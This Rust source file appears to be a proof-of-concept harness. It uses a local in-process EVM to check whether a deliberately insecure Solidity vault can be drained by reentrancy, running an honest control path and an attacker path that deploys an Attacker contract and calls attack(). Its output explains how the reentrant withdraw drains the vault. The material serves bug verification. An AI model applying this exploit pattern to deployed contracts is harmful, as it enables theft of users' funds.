//! Two-sided EVM adjudication PoC driving a Solidity target through the REAL EVM (revm).
//! The EVM analog of the dark-factory solana-harness: deploy the target + attacker bytecode,
//! run a CONTROL path (honest deposit/withdraw conserves) and an EXPLOIT path (reentrancy),
//! and gate the verdict on the same two-sided contract the colony uses:
//!   CONTROL OK:        the honest flow works on this exact target (harness is not rigged)
//!   INVARIANT VIOLATED: the attacker ends with more than it staked -> bug verified, exit 101
//!
//! argv[1] = path to the vault creation-bytecode (.bin), argv[2] = Attacker .bin.
use revm::db::{CacheDB, EmptyDB};
use revm::primitives::{
    keccak256, AccountInfo, Address, Bytes, ExecutionResult, Output, TxKind, U256,
};
use revm::Evm;
use std::process::exit;

const ETH: u128 = 1_000_000_000_000_000_000;

fn selector(sig: &str) -> Vec<u8> {
    keccak256(sig.as_bytes())[..4].to_vec()
}

fn load_bin(path: &str) -> Bytes {
    let s = std::fs::read_to_string(path).expect("read bin");
    Bytes::from(hex::decode(s.trim()).expect("hex decode"))
}

/// 32-byte left-padded ABI encoding of an address (for a `constructor(address)`).
fn abi_addr(a: Address) -> Vec<u8> {
    let mut v = vec![0u8; 12];
    v.extend_from_slice(a.as_slice());
    v
}

type Db = CacheDB<EmptyDB>;

fn fund(evm: &mut Evm<'_, (), Db>, addr: Address, wei: U256) {
    evm.db_mut().insert_account_info(
        addr,
        AccountInfo {
            balance: wei,
            ..Default::default()
        },
    );
}

fn balance(evm: &mut Evm<'_, (), Db>, addr: Address) -> U256 {
    evm.db_mut()
        .accounts
        .get(&addr)
        .map(|a| a.info.balance)
        .unwrap_or(U256::ZERO)
}

fn run(
    evm: &mut Evm<'_, (), Db>,
    caller: Address,
    to: TxKind,
    value: U256,
    data: Vec<u8>,
) -> ExecutionResult {
    {
        let tx = evm.tx_mut();
        tx.caller = caller;
        tx.transact_to = to;
        tx.value = value;
        tx.data = Bytes::from(data);
        tx.gas_limit = 30_000_000;
        tx.gas_price = U256::ZERO;
        tx.nonce = None;
    }
    evm.transact_commit().expect("transact")
}

fn created_addr(r: &ExecutionResult) -> Address {
    match r {
        ExecutionResult::Success {
            output: Output::Create(_, Some(a)),
            ..
        } => *a,
        other => panic!("deploy failed: {other:?}"),
    }
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    let vault_bin = args.get(1).map(|s| s.as_str()).unwrap_or("/tmp/evm-bytecode/ReentrancyVaultInsecure.bin");
    let attacker_bin = args.get(2).map(|s| s.as_str()).unwrap_or("/tmp/evm-bytecode/Attacker.bin");

    let vault_code = load_bin(vault_bin);
    let attacker_code = load_bin(attacker_bin);

    let deployer = Address::from([0x11; 20]);
    let honest = Address::from([0x22; 20]);
    let depositor = Address::from([0x33; 20]);
    let attacker_owner = Address::from([0x44; 20]);

    let mut evm = Evm::builder().with_db(CacheDB::new(EmptyDB::default())).build();

    fund(&mut evm, deployer, U256::from(100 * ETH));
    fund(&mut evm, honest, U256::from(100 * ETH));
    fund(&mut evm, depositor, U256::from(100 * ETH));
    fund(&mut evm, attacker_owner, U256::from(100 * ETH));

    let sel_deposit = selector("deposit()");
    let sel_withdraw = selector("withdraw()");
    let sel_attack = selector("attack()");

    // ---------- CONTROL: honest deposit + withdraw on a fresh instance of THIS target ----------
    let vault_c = created_addr(&run(&mut evm, deployer, TxKind::Create, U256::ZERO, vault_code.to_vec()));
    let h_before = balance(&mut evm, honest);
    let dep = run(&mut evm, honest, TxKind::Call(vault_c), U256::from(5 * ETH), sel_deposit.clone());
    assert!(dep.is_success(), "control deposit failed: {dep:?}");
    let wd = run(&mut evm, honest, TxKind::Call(vault_c), U256::ZERO, sel_withdraw.clone());
    let h_after = balance(&mut evm, honest);
    let vault_c_bal = balance(&mut evm, vault_c);
    if wd.is_success() && h_after == h_before && vault_c_bal == U256::ZERO {
        println!("CONTROL OK: honest deposit+withdraw conserves funds (user restored to {h_after}, vault drained to 0)");
    } else {
        println!("control anomaly: wd_ok={} h_before={h_before} h_after={h_after} vault={vault_c_bal}", wd.is_success());
    }

    // ---------- EXPLOIT: reentrancy on a fresh instance with honest TVL ----------
    let stake = U256::from(1 * ETH);
    let honest_tvl = U256::from(5 * ETH);
    let vault_e = created_addr(&run(&mut evm, deployer, TxKind::Create, U256::ZERO, vault_code.to_vec()));
    // honest depositor seeds 5 ETH of TVL the attacker will try to steal.
    let d = run(&mut evm, depositor, TxKind::Call(vault_e), honest_tvl, sel_deposit.clone());
    assert!(d.is_success(), "tvl deposit failed: {d:?}");

    // deploy attacker(vault_e)
    let mut attacker_create = attacker_code.to_vec();
    attacker_create.extend_from_slice(&abi_addr(vault_e));
    let attacker = created_addr(&run(&mut evm, attacker_owner, TxKind::Create, U256::ZERO, attacker_create));

    // attacker.attack{value: 1 ETH}()
    let _ = run(&mut evm, attacker_owner, TxKind::Call(attacker), stake, sel_attack.clone());

    let attacker_bal = balance(&mut evm, attacker);
    let vault_e_bal = balance(&mut evm, vault_e);

    // INVARIANT: the attacker can never end holding more than it staked.
    if attacker_bal > stake {
        let stolen = attacker_bal - stake;
        eprintln!(
            "INVARIANT VIOLATED: attacker staked {stake} but holds {attacker_bal} after attack \
             (stole {stolen} wei); vault drained from {honest_tvl}+stake to {vault_e_bal}. \
             Reentrancy: withdraw() sends ETH before zeroing balance, the receive() callback \
             re-enters withdraw() and the whole vault is drained."
        );
        exit(101);
    } else {
        println!(
            "invariant held: attacker holds {attacker_bal} <= stake {stake}; vault retains {vault_e_bal}. \
             The reentrant withdraw reverted (balance zeroed before the external call)."
        );
    }
}
